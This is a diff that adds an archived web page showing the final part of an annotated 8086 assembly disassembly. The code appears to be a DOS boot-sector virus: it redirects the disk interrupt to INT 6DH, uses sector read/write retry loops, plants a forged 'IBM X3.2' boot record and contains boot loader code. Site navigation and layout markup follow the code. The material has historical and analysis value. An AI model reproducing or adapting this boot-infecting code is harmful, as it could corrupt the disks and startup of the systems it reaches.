+;        DS:[226H] = DRIVE                       ;<br>
+;        DS:[0009] = HEAD                        ;<br>
+;        DS:[000A] = SECTOR                      ;<br>
+;        DS:[000B] = TRACK                       ;<br>
+;-----------------------------------------------------------------------;<br>
+DO_SECTORS:                  ;0870<br>
+PUSH BX             ;<br>
+MOV  CX,4           ;RETRY COUNT = 4<br>
+;<br>
+D1S_10:  PUSH CX             ;<br>
+MOV  DH,[9]              ;HEAD = 9<br>
+MOV  DL,[226H]      ;DRIVE<br>
+MOV  CX,[10]             ;TRACK/SECT<br>
+MOV  AX,[602H]      ;COMMAND/COUNT<br>
+INT  6DH            ;(SAME AS INT 13)<br>
+JNB  D1S_80              ;<br>
+;<br>
+MOV  AH,00               ;RESET<br>
+INT  6DH            ;(SAME AS INT 13)<br>
+POP  CX             ;<br>
+LOOP D1S_10              ;TRY AGAIN<br>
+POP  BX             ;<br>
+POP  BX             ;<br>
+STC                 ;RETURN ERROR<br>
+RET                 ;<br>
+;<br>
+D1S_80:  POP  CX             ;0893 59<br>
+POP  BX             ;0894 5B<br>
+RET                 ;0895 C3<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; INC. NEXT SECTOR                               ;<br>
+; ON ENTRY:   DS:[0009] = HEAD                        ;<br>
+;        DS:[000A] = SECTOR                      ;<br>
+;        DS:[000B] = TRACK                       ;<br>
+;-----------------------------------------------------------------------;<br>
+NEXT_SECTOR:                 ;0896<br>
+INC  Byte Ptr [10]       ;SECTOR<br>
+CMP  Byte Ptr [10],10    ;<br>
+JNZ  NS_90               ;<br>
+MOV  Byte Ptr [10],1          ;<br>
+INC  Byte Ptr [9]        ;HEAD<br>
+CMP  Byte Ptr [9],2      ;<br>
+JNZ  NS_90               ;<br>
+MOV  Byte Ptr [9],0      ;<br>
+INC  Byte Ptr [11]       ;TRACK<br>
+NS_90:   RET                 ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+DB   64             ;08BB 'dtk'<br>
+JZ   ;091F               ;<br>
+;<br>
+;---------------------------------------;<br>
+JMP  CONTINUE_4          ;08FA<br>
+;<br>
+DB   'IBM X3.2'     ;OEM NAME AND VERSION<br>
+;<br>
+DW   512       ;BYTES PER SECTOR<br>
+DB   2         ;SECTORS PER ALLOCATION UNIT<br>
+DW   1         ;RESERVED SECTORS<br>
+DB   2         ;NUMBER OF FATS<br>
+DW   112       ;NUMBER OF ROOT DIR ENTRIES<br>
+DW   2D0H      ;SECTORS PER DISK<br>
+DB   0FDH      ;MEDIA ID<br>
+DW   2         ;SECTORS PER FAT<br>
+DW   9         ;SECTORS PER TRACK<br>
+DW   2         ;NUMBER OF HEADS<br>
+DW   0         ;HIDDEN SECTORS<br>
+;<br>
+;---------------------------------------;<br>
+DB   0,0<br>
+DB   0,0,0,0,0,0,0,0,0,0,0,0,0,0<br>
+<br>
+DB   002H,0DFH<br>
+DB   002H,025H,002H,012H<br>
+DB   02AH,0FFH,050H,0F6H<br>
+DB   000H,002H,<br>
+<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+INT  19H            ;REBOOT<br>
+;<br>
+L08FA:   CLI                 ;08FA FA<br>
+XOR  AX,AX               ;08FB 33C0<br>
+MOV  ES,AX               ;08FD 8EC0<br>
+MOV  SS,AX               ;08FF 8ED0<br>
+MOV  SP,7C00             ;0901 BC007C<br>
+MOV  DS,AX               ;0904 8ED8<br>
+MOV  BX,07C0             ;0906 BBC007<br>
+MOV  Word Ptr [0078],002F     ;0909 C70678002F00<br>
+MOV  [007A],BX      ;090F 891E7A00<br>
+MOV  DS,BX               ;0913 8EDB<br>
+MOV  DX,[001E]      ;0915 8B161E00<br>
+MOV  [0020],DL      ;0919 88162000<br>
+INT  13             ;GO TO DISK<br>
+JNB  ;0924               ;091F 7303<br>
+JMP  ;09FC               ;0921 E9D800<br>
+MOV  SI,000B             ;0924 BE0B00<br>
+MOV  CX,[SI]             ;0927 8B0C<br>
+SHR  CH,1           ;0929 D0ED<br>
+XCHG CH,CL               ;092B 86E9<br>
+MOV  [002B],CX      ;092D 890E2B00<br>
+MOV  AL,[SI+05]          ;0931 8A4405<br>
+XOR  AH,AH               ;0934 32E4<br>
+MUL  Word Ptr [SI+0B]    ;0936 F7640B<br>
+ADD  AX,[SI+03]          ;0939 034403<br>
+ADD  AX,[SI+11]          ;093C 034411<br>
+MOV  [0024],AX      ;093F A32400<br>
+MOV  BX,7E00             ;0942 BB007E<br>
+CALL 0A24           ;0945 E8DC00<br>
+MOV  BX,ES               ;0948 8CC3<br>
+MOV  AX,0070             ;094A B87000<br>
+MOV  ES,AX               ;094D 8EC0<br>
+MOV  AX,0020             ;094F B82000<br>
+MUL  Word Ptr [SI+06]    ;0952 F76406<br>
+MOV  CX,[SI]             ;0955 8B0C<br>
+ADD  AX,CX               ;0957 03C1<br>
+DEC  AX             ;0959 48<br>
+DIV  CX             ;095A F7F1<br>
+ADD  [0024],AX      ;095C 01062400<br>
+MOV  CL,[002A]      ;0960 8A0E2A00<br>
+MOV  AX,[0024]      ;0964 A12400<br>
+CALL ;0971               ;0967 E80700<br>
+PUSH ES             ;096A 06<br>
+POP  DS             ;096B 1F<br>
+JMP  0070:0000      ;096C EA00007000<br>
+;<br>
+;HEAVY NUMBER CRUNCHING HERE      ;<br>
+PUSH BX             ;0971 53<br>
+PUSH AX             ;0972 50<br>
+MOV  AL,CL               ;0973 8AC1<br>
+MUL  Byte Ptr [002B]          ;0975 F6262B00<br>
+MOV  [0029],AL      ;0979 A22900<br>
+POP  AX             ;097C 58<br>
+MUL  Word Ptr [002B]          ;097D F7262B00<br>
+DIV  Word Ptr [SI+0D]    ;0981 F7740D<br>
+INC  DL             ;0984 FEC2<br>
+MOV  [0028],DL      ;0986 88162800<br>
+PUSH DX             ;098A 52<br>
+XOR  DX,DX               ;098B 33D2<br>
+DIV  Word Ptr [SI+0F]    ;098D F7740F<br>
+MOV  [0021],DL      ;0990 88162100<br>
+MOV  [0026],AX      ;0994 A32600<br>
+POP  DX             ;0997 5A<br>
+MOV  CL,[0029]      ;0998 8A0E2900<br>
+ADD  DL,CL               ;099C 02D1<br>
+MOV  AX,[SI+0D]          ;099E 8B440D<br>
+INC  AX             ;09A1 40<br>
+CMP  DL,AL               ;09A2 3AD0<br>
+JBE  ;09AC               ;09A4 7606<br>
+SUB  AL,[0028]      ;09A6 2A062800<br>
+MOV  CL,AL               ;09AA 8AC8<br>
+MOV  AL,CL               ;09AC 8AC1<br>
+MOV  DX,[0026]      ;09AE 8B162600<br>
+MOV  CL,06               ;09B2 B106<br>
+SHL  DH,CL               ;09B4 D2E6<br>
+OR   DH,[0028]      ;09B6 0A362800<br>
+MOV  CX,DX               ;09BA 8BCA<br>
+XCHG CH,CL               ;09BC 86E9<br>
+MOV  DX,[0020]      ;09BE 8B162000<br>
+MOV  AH,02               ;READ SECTOR<br>
+PUSH AX             ;<br>
+INT  13             ;<br>
+POP  AX             ;09C7 58<br>
+JB   ;09FC               ;09C8 7232<br>
+SUB  [0029],AL      ;09CA 28062900<br>
+JBE  ;09F5               ;09CE 7625<br>
+CBW                 ;09D0 98<br>
+MUL  Word Ptr [002D]          ;09D1 F7262D00<br>
+ADD  BX,AX               ;09D5 03D8<br>
+INC  Byte Ptr [0021]          ;09D7 FE062100<br>
+MOV  DL,[0021]      ;09DB 8A162100<br>
+CMP  DL,[SI+0F]          ;09DF 3A540F<br>
+MOV  DL,01               ;09E2 B201<br>
+MOV  [0028],DL      ;09E4 88162800<br>
+JB   ;0998               ;09E8 72AE<br>
+MOV  Byte Ptr [0021],00  ;09EA C606210000<br>
+INC  Word Ptr [0026]          ;09EF FF062600<br>
+JMP  ;0998               ;09F3 EBA3<br>
+POP  BX             ;09F5 5B<br>
+RET                 ;09F6 C3<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+MOV  SI,01B3             ;09F7 BEB301<br>
+JMP  ;09FF               ;09FA EB03<br>
+MOV  SI,01C5             ;09FC BEC501<br>
+CALL L0A15               ;09FF E81300<br>
+MOV  SI,01D4             ;0A02 BED401<br>
+CALL L0A15               ;0A05 E80D00<br>
+MOV  AH,00               ;0A08 B400<br>
+INT  16             ;0A0A CD16<br>
+MOV  AH,01               ;0A0C B401<br>
+INT  16             ;0A0E CD16<br>
+JNZ  0A0C           ;0A10 75FA<br>
+JMP  ;08F8               ;0A12 E9E3FE<br>
+;<br>
+L0A15:   LODSB                    ;L0A15<br>
+OR   AL,AL               ;0A16 0AC0<br>
+JZ   0A23           ;0A18 7409<br>
+MOV  AH,0E               ;0A1A B40E<br>
+MOV  BX,0007             ;0A1C BB0700<br>
+INT  10             ;0A1F CD10<br>
+JMP  L0A15               ;0A21 EBF2<br>
+RET                 ;0A23 C3<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+<br>
+MOV  CL,01               ;0A24 B101<br>
+CALL ;0971               ;0A26 E848FF<br>
+PUSH SI             ;0A29 56<br>
+MOV  DI,BX               ;0A2A 8BFB<br>
+MOV  AX,ES:[BX+1C]       ;0A2C 268B471C<br>
+XOR  DX,DX               ;0A30 33D2<br>
+DIV  Word Ptr [SI]       ;0A32 F734<br>
+INC  AL             ;0A34 FEC0<br>
+MOV  [002A],AL      ;0A36 A22A00<br>
+MOV  SI,019D             ;0A39 BE9D01<br>
+MOV  CX,000B             ;0A3C B90B00<br>
+REPZ                ;0A3F F3<br>
+CMPSB                    ;0A40 A6<br>
+JNZ  ;09F7               ;0A41 75B4<br>
+MOV  AX,ES:[BX+3A]       ;0A43 268B473A<br>
+MOV  [0022],AX      ;0A47 A32200<br>
+MOV  DI,BX               ;0A4A 8BFB<br>
+ADD  DI,+20              ;0A4C 83C720<br>
+MOV  SI,01A8             ;0A4F BEA801<br>
+MOV  CX,000B             ;0A52 B90B00<br>
+REPZ                ;0A55 F3<br>
+CMPSB                    ;0A56 A6<br>
+JNZ  ;09F7               ;0A57 759E<br>
+POP  SI             ;0A59 5E<br>
+RET                 ;0A5A C3<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+CODE     ENDS                ;<br>
+END                 ;
+					</td>
+					<td width="13" background="../../../images/t3/0rm.jpg"><img src="../../../images/t3/0.gif"></td>
+				</tr>
+
+				<tr valign="top">
+					<td width="13" background="../../../images/t3/0cm.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="97%" background="../../../images/t3/0cm.jpg">
+						<center>
+							&nbsp;<br>
+							<span class="copyright">To the best of our knowledge, the text on this page may be freely reproduced and distributed.</span>
+							<br>&nbsp;<br>
+						</center>
+					</td>
+					<td width="13" background="../../../images/t3/0rm.jpg"><img src="../../../images/t3/0.gif"></td>
+				</tr>
+
+				<tr valign="bottom">
+					<td width="13" height="15" background="../../../images/t3/3lm.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="96%" height="15" background="../../../images/t3/3cm.jpg">
+						&nbsp;
+						<center><span class="navbotpipe"><span class="navbot"><a href="../../../#" class="navbot">About</a> | <a href="../../../#" class="navbot">Community</a> | <a href="../../../#" class="navbot">Art</a> | <a href="../../../#" class="navbot">Carnality</a> | <a href="../../../#" class="navbot">Entertainment</a> | <a href="../../../#" class="navbot">Science</a> | <a href="../../../#" class="navbot">Society</a> | <a href="../../../#" class="navbot">Technology</a></span></span></center>
+					</td>
+					<td width="13" height="15" background="../../../images/t3/3rm.jpg"><img src="../../../images/t3/0.gif"></td>
+				</tr>
+
+				<tr>
+					<td width="13" height="17" background="../../../images/t3/3lb.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="96%" height="17" background="../../../images/t3/3cb.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="13" height="17" background="../../../images/t3/3rb.jpg"><img src="../../../images/t3/0.gif"></td>
+				</tr>
+
+			</table>
+		</td>
+
+		<!-- Right sidebar: Hot Topics (real random threads, JS-populated) + ad slots -->
+		<td width="20%" align="center" valign="top">
+
+			<table width="170" border="0" cellpadding="0" cellspacing="0">
+				<tr>
+					<td width="13" height="11" background="../../../images/t3/1lt.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="144" height="11" background="../../../images/t3/1ct.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="13" height="11" background="../../../images/t3/1rt.jpg"><img src="../../../images/t3/0.gif"></td>
+				</tr>
+				<tr>
+					<td width="13" background="../../../images/t3/1lm.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="144" background="../../../images/t3/1cm.jpg">
+						<center><span class="hottop">Hot Topics</span></center>
+						<table border="0" cellpadding="1" cellspacing="2" width="100%" id="hot-topics-list">
+							<!-- populated client-side with 10 random real threads from the archive -->
+						</table>
+					</td>
+					<td width="13" background="../../../images/t3/1rm.jpg"><img src="../../../images/t3/0.gif"></td>
+				</tr>
+				<tr>
+					<td width="13" height="17" background="../../../images/t3/1lb.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="144" height="17" background="../../../images/t3/1cb.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="13" height="17" background="../../../images/t3/1rb.jpg"><img src="../../../images/t3/0.gif"></td>
+				</tr>
+			</table>
+
+			&nbsp;
+
+			<!-- Recovered original ad images, rotated randomly client-side - nostalgia only, not live/tracking ads -->
+			<center>
+				<img id="ad-slot-mini-1" src="" alt="" border="1" style="display:none;">
+				<br>&nbsp;<br>
+				<img id="ad-slot-mini-2" src="" alt="" border="1" style="display:none;">
+			</center>
+
+		</td>
+	</tr>
+</table>
+
+<script src="../../../assets/site.js"></script>
+
+</body>
+</html>
